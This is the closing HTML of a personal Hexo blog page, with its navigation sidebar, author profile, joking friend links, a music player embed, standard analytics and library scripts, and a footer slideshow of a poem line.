            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>27</strong><br>文章</div></a>
      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
          喜欢啥几把BB的狗骑驴
        </a>
      
        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
          喜欢gay在狗骑驴旁边的狗逼
        </a>
      
        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
          gay里gay气的大黄
        </a>
      
        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
          郁离歌大手子的博客
        </a>
      
        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
          有很多小姐姐的烧包包
        </a>
      
    </div>
  </div>
</div>

  
</aside>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2017 - 2018 Iuhrey<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
      
    </div>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>



  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>
<script src="/js/script.js"></script>



  </div>
</body>
</html>